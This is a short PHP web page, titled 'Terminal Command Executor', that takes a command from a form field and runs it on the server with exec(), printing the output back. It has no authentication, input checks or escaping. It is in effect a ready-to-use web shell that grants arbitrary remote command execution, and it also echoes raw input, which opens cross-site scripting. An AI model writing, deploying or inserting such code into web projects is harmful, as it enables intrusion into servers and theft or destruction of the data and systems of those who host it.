<!DOCTYPE html>
<html>
<head>
    <title>Terminal Command Executor</title>
</head>
<body>

<form method="post" action="">
    <label for="command">Enter Command:</label>
    <input type="text" id="command" name="command" placeholder="Enter your command">
    <input type="submit" name="execute" value="Execute">
</form>

<?php
if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST['execute'])) {
    // Check if a command is entered
    if (!empty($_POST['command'])) {
        $command = $_POST['command'];
        $output = array(); // This will store the output of the command

        // Execute the command
        exec($command, $output, $return_var);

        // Output the result
        echo "<h3>Command: $command</h3>";
        echo "<h3>Output:</h3>";
        echo "<pre>" . implode("\n", $output) . "</pre>";
        echo "<h3>Return value: $return_var</h3>";
    } else {
        echo "<h3>Please enter a command.</h3>";
    }
}
?>

</body>
</html>
